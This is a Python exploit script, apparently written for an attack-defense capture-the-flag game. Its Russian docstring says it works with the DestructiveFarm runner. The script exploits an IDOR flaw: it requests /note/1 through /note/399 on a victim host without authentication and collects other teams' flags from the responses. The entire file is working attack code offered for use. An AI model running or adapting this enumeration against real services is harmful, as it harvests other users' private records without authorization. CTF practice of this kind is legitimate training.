#!/usr/bin/env python3
"""notes — IDOR. Перебираем /note/<id> без авторизации, забираем чужие флаги.
Запуск: notes.py <ip_жертвы> [порт]   (печатает найденные флаги в stdout)
Формат под DestructiveFarm: один аргумент-хост, флаги построчно в stdout."""
import os
import re
import sys

import requests

FLAG = re.compile(os.environ.get("FLAG_FORMAT", r"[A-Z0-9]{31}="))
HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else int(os.environ.get("PORT", "5001"))
BASE = f"http://{HOST}:{PORT}"

flags = set()
for i in range(1, 400):
    try:
        r = requests.get(f"{BASE}/note/{i}", timeout=2)
    except requests.RequestException:
        break
    if r.status_code == 200:
        flags.update(FLAG.findall(r.text))

for f in sorted(flags):
    print(f)
